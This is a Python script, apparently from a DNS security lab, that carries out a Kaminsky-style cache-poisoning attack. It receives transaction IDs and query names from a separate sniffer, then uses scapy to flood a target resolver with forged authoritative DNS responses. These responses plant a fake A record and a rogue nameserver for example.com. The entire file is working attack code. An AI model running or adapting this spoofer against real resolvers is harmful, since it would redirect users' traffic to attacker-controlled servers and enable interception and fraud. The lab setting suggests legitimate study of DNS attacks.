#!/usr/bin/env python3
"""Nhan hit UDP tu sniff va gui spoof Kaminsky tu Attacker (dung MAC)."""
import socket
import sys
import time
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send

LISTEN_PORT = 39099
TARGET = "10.2.6.53"
POISON_NS = "ns.attacker32.com"
POISON_NS_IP = "10.2.6.153"
POISON_A = "1.2.3.4"


def spoof(txid: int, qname: str, ns_ip: str, dport: int) -> None:
    pkt = (
        IP(dst=TARGET, src=ns_ip)
        / UDP(sport=53, dport=dport, chksum=0)
        / DNS(
            id=txid,
            qr=1,
            aa=1,
            rd=1,
            ra=0,
            qd=DNSQR(qname=qname),
            an=DNSRR(rrname=qname, type="A", rdata=POISON_A, ttl=259200),
            ns=DNSRR(rrname="example.com", type="NS", rdata=POISON_NS, ttl=259200),
            ar=DNSRR(rrname=POISON_NS, type="A", rdata=POISON_NS_IP, ttl=259200),
        )
    )
    send(pkt, count=60, verbose=0)


def main() -> int:
    seconds = int(sys.argv[1]) if len(sys.argv) > 1 else 40
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", LISTEN_PORT))
    sock.settimeout(0.5)
    print(f"[sender] listen UDP :{LISTEN_PORT} for {seconds}s", flush=True)
    deadline = time.time() + seconds
    sent = 0
    while time.time() < deadline:
        try:
            data, _addr = sock.recvfrom(256)
        except socket.timeout:
            continue
        parts = data.decode(errors="ignore").strip().split()
        if len(parts) not in (3, 4):
            continue
        txid = int(parts[0])
        qname = parts[1]
        ns_ip = parts[2]
        dport = int(parts[3]) if len(parts) == 4 else 44444
        spoof(txid, qname, ns_ip, dport)
        sent += 1
        print(
            f"[sender] spoofed #{sent} txid={txid} dport={dport} {qname} via {ns_ip}",
            flush=True,
        )
    sock.close()
    print(f"[sender] done sent={sent}", flush=True)
    return 0 if sent > 0 else 2


if __name__ == "__main__":
    raise SystemExit(main())
